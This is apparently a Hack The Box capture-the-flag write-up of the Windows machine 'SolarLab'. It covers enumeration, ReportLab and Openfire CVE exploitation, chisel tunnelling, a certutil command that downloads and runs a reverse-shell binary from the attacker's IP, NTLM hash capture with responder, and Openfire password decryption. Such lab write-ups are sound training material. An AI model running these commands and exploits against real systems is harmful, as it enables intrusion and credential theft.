+++
title = 'SolarLab'
date = 2024-11-09
draft = false
tags = ["Windows"]
category = ["htb"]
summary = "HTB - Linux - Medium"
+++

# Enum

## Port Scanning
```bash
┌──(fish㉿kali)-[~/htb/solarlab]
└─$ nmap -p- -T5 -oN all-ports.nmap $IP 
...
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
6791/tcp open  hnm
7680/tcp open  pando-pub

┌──(fish㉿kali)-[~/htb/solarlab]
└─$ nmap -p80,135,139,445,6791,7680 -A -oN service-scan.nmap $IP
...
PORT     STATE SERVICE       VERSION
80/tcp   open  http          nginx 1.24.0
|_http-server-header: nginx/1.24.0
|_http-title: Did not follow redirect to http://solarlab.htb/
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
6791/tcp open  http          nginx 1.24.0
|_http-title: Did not follow redirect to http://report.solarlab.htb:6791/
|_http-server-header: nginx/1.24.0
7680/tcp open  pando-pub?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

Port description:
```bash
80 - HTTP running nginx 1.24 (solarlab.htb)
135/139/445 - Standard SMB related windows ports
6791 - HTTP running nginx 1.24 (report.solarlab.htb:6791)
7680 - WUDO (Windows Update Delivery Optimization), not super interesting
```

Nmap scans found two hostnames `solarlab.htb` on port 80 and `report.solarlab.htb` on port 6791. Adding to my `/etc/hosts` file.

![](/Screenshots/SolarLab_image_1.png)

# 80 / HTTP
![](/Screenshots/SolarLab_image_2.png)

Looking at the source, just appears to be a static site. Footer has some theme information `jeweltheme`
![](/Screenshots/SolarLab_image_3.png)
```html
<!-- Footer Section -->
		<footer id="footer-section">
			<p class="copyright">
				&copy; <a href="[http://jeweltheme.com/html/kite/](view-source:http://jeweltheme.com/html/kite/)">Kite</a> 2014-2015, All Rights Reserved. Designed by & Developed by <a href="[http://jeweltheme.com](view-source:http://jeweltheme.com/)">Jewel Theme</a>
			</p>
		</footer>
		<!-- Footer Section End -->
```

Running gobuster to enum and dirs or files, doesn't find anything interesting
```bash
┌──(fish㉿kali)-[~/htb/solarlab]
└─$ gobuster dir -u $URL -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -t 50 -x php -b 404 -o gobuster-80.out   
...
/images               (Status: 301) [Size: 169] [--> http://solarlab.htb/images/]
/assets               (Status: 301) [Size: 169] [--> http://solarlab.htb/assets/]
/Images               (Status: 301) [Size: 169] [--> http://solarlab.htb/Images/]
/.                    (Status: 200) [Size: 16210]
/Assets               (Status: 301) [Size: 169] [--> http://solarlab.htb/Assets/]
/IMAGES               (Status: 301) [Size: 169] [--> http://solarlab.htb/IMAGES/]
/con                  (Status: 500) [Size: 177]
/ASSETS               (Status: 301) [Size: 169] [--> http://solarlab.htb/ASSETS/]
```

## 6791 / HTTP
![](/Screenshots/SolarLab_image_4.png)

Default page is a login form. Running gobuster, there may be some throttling or the server is just unstable as we start seeing 502 errors.

```bash
┌──(fish㉿kali)-[~/htb/solarlab]
└─$ gobuster dir -u $URL -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -t 20 -x php -b 404 -o gobuster-6791.out 
```

![](/Screenshots/SolarLab_image_5.png)


Examining a login request with burp suite;
![](/Screenshots/SolarLab_image_6.png)

Running sqlmap against the request doesn't return any injectable parameters.

Checking for other subdomains with ffuf:
```bash
URL=http://report.solarlab.htb:6791

┌──(fish㉿kali)-[~/htb/solarlab]
└─$ ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt:FUZZ -u $URL -H 'Host: FUZZ.solarlab.htb:6791' -fs 169
...
report                  [Status: 200, Size: 2045, Words: 772, Lines: 85, Duration: 39ms]

```

## 445/SMB

Checking out the smb server to see if we can access any shares:
```bash
┌──(fish㉿kali)-[~/htb/solarlab]
└─$ smbclient -U '' -L \\\\solarlab.htb\\Documents\\  
...
┌──(fish㉿kali)-[~/htb/solarlab]
└─$ smbclient -U '' \\\\solarlab.htb\\Documents\\ 
```
![](/Screenshots/SolarLab_image_7.png)

And we can read files from the `Documents` share. i'm going to download all the files and check them out on my kali box.
![](/Screenshots/SolarLab_image_8.png)

Checking out `details-file.xlsx` gets us some potential creds and emails.

![](/Screenshots/SolarLab_image_9.png)
```bash
Usernames:

Alexander.knight@gmail.com
KAlexander
Alexander.knight@gmail.com
blake.byte
AlexanderK
ClaudiaS

Emails:
Alexander.knight@gmail.com
Alexander.knight@gmail.com
Claudia.springer@gmail.com
blake@purdue.edu
Alexander.knight@gmail.com
Claudia.springer@gmail.com

Passwords:
al;ksdhfewoiuh
dkjafblkjadsfgl
d398sadsknr390
ThisCanB3typedeasily1@
danenacia9234n
dadsfawe9dafkn

```

Nothing else really interesting in the other files.

Lets see if we can use this to login to the web app.

![](/Screenshots/SolarLab_image_10.png)

Not with those passwords, but we can identify user names. Responses of length 2419 have a different error than requests with usernames that don't exist.
`User authentication error.`.

![](/Screenshots/SolarLab_image_11.png)

This gives us two valid usernames for the app. We can take an educated guess and add `blakeb` as this seems to be the correct format
```bash
ClaudiaS
AlexanderK
blakeb
```

Adding the username `blakeb` and re-running intruder gets us a valid login with
`blakeb:ThisCanB3typedeasily1@`
![](/Screenshots/SolarLab_image_12.png)

![](/Screenshots/SolarLab_image_13.png)


We can use the app got generate PDFs.

![](/Screenshots/SolarLab_image_14.png)
![](/Screenshots/SolarLab_image_15.png)
![](/Screenshots/SolarLab_image_16.png)

Looking at the PDF that's returned the app is using ReportLab for PDF generation
![](/Screenshots/SolarLab_image_17.png)




---
# Foothold

There's a vulnerability within certain version of ReportLab allowing code exection.

>CVE-2023-33733 is a Remote Code Execution (RCE) vulnerability residing in the HTML parsing functionality of Reportlab, a popular Python library used for generating PDF documents from HTML data. This vulnerability allows attackers to execute arbitrary code on the system running the vulnerable Reportlab version. Reportlab's HTML parser suffers from improper handling of certain HTML elements, specifically those lacking proper closing tags. An attacker can exploit this by crafting a malicious HTML snippet containing an unclosed <img> tag with a specially crafted src attribute. When Reportlab attempts to parse this element, the lack of a closing tag can lead to unintended code execution due to how the parser processes the following content.

There's multiple exploits on github for this, I attempted to manually exploit it with the payload from https://ethicalhacking.uk/cve-2023-33733-rce-in-reportlabs-html-parser/#gsc.tab=0 but was having issues due to character limits in the `user_input` field of the request.

![](/Screenshots/SolarLab_image_18.png)
![](/Screenshots/SolarLab_image_19.png)

Found another version of the exploit that works and gets us a reverse powershell shell.
https://github.com/L41KAA/CVE-2023-33733-Exploit-PoC
![](/Screenshots/SolarLab_image_20.png)

![](/Screenshots/SolarLab_image_21.png)
![](/Screenshots/Pasted image 20240831165228.png)





## Exploits
https://github.com/L41KAA/CVE-2023-33733-Exploit-PoC

--- 
# PrivEsc

Downloaded winipeas to the box to check for any easy escalations.


![](/Screenshots/SolarLab_image_22.png)

```bash
PS C:\Users\blake\Desktop> type ../Documents/start-app.bat
@ECHO OFF

cd "c:\users\blake\documents\app"

:loopstart
START /B waitress-serve.exe --listen 127.0.0.1:5000 --threads 10 app:app
timeout /t 600 /nobreak > NUL
taskkill /f /im python3.11.exe 
timeout /t 5 /nobreak > NUL
goto loopstart

```

`start-app.bat`, has a service listening on localhost:5000. Looking into it it's just the instance of reportlab. Winpeas didn't pick it up for some reason but running netstat shows a listening port on 9090. 

![](/Screenshots/SolarLab_image_23.png)


Setting up a reverse socks proxy with chisel so we can view the app on port 9090 from our browser.

```bash
┌──(fish㉿kali)-[~/htb/solarlab/www]
└─$ ./chisel_arm server --reverse --port 443
...
PS C:\Users\blake\Desktop> ./chisel.exe client 10.10.14.7:443 R:socks
```

![](/Screenshots/SolarLab_image_24.png)

`Openfire, Version: 4.7.4`
https://github.com/K3ysTr0K3R/CVE-2023-32315-EXPLOIT

There's an exploit for OpenFIre and this version doesn't appear to be patched.

```bash
┌──(fish㉿kali)-[~/htb/solarlab/CVE-2023-32315-EXPLOIT]
└─$ proxychains python3 CVE-2023-32315.py -u http://localhost:9090
...
[*] Launching exploit against: http://localhost:9090
[*] Checking if the target is vulnerable
[+] Target is vulnerable
[*] Adding credentials
[+] Successfully added, here are the credentials
[+] Username: hugme
[+] Password: HugmeNOW
```
![](/Screenshots/SolarLab_image_25.png)

![](/Screenshots/SolarLab_image_26.png)

And we can login to the web server.



![](/Screenshots/SolarLab_image_27.png)


Uploaded plugin
![](/Screenshots/SolarLab_image_28.png)

We can then find the tool at Server >> Server Settings >> Management Tool and we can plugin the password to access the web shell.

![](/Screenshots/SolarLab_image_29.png)

We can select system command from the pull down to execute commands
![](/Screenshots/SolarLab_image_30.png)

We can get a shell as the openfire user by downloading a rev shell and then sending a second command to execute it.
```bash
certutil.exe -urlcache -f http://10.10.14.7:9002/fish-9003.exe fish.exe 


./fish.exe
```

We can capture the hash for the user by setting up responder then performing a curl request
```bash
C:\Program Files\Openfire>curl.exe file://10.10.14.7/test
curl.exe file://10.10.14.7/test
curl: (37) Couldn't open file //10.10.14.7/test
```

![](/Screenshots/SolarLab_image_31.png)

![](/Screenshots/SolarLab_image_32.png)

Openfire db script with the admin's password

```
C:\Program Files\Openfire\embedded-db>type openfire.script
```

We can download a tool to crack it

https://github.com/c0rdis/openfire_decrypt/blob/master/OpenFireDecryptPass.java

We need the encrypted password and the password key
![](/Screenshots/SolarLab_image_33.png)
![](/Screenshots/SolarLab_image_34.png)
```bash
becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442

hGXiFzsKaAeYLjn
```

```bash
┌──(fish㉿kali)-[~/htb/solarlab/www]
└─$ java OpenFireDecryptPass becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442 hGXiFzsKaAeYLjn
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
ThisPasswordShouldDo!@ (hex: 005400680069007300500061007300730077006F0072006400530068006F0075006C00640044006F00210040)

```

![](/Screenshots/SolarLab_image_35.png)

And we got the admin's password!
```
administrator:ThisPasswordShouldDo!@
```

We can then access the box with psexec.py and grab the admin flag.
![](/Screenshots/SolarLab_image_36.png)







## Exploits
https://github.com/K3ysTr0K3R/CVE-2023-32315-EXPLOIT

---


# Post/Pivot



---

# Loot

## Creds

| User | Hash | Pass | Location |
| ---- | ---- | ---- | -------- |
|      |      |      |          |

## Flags
| file | Hash |
| ---- | ---- |
|      |      |

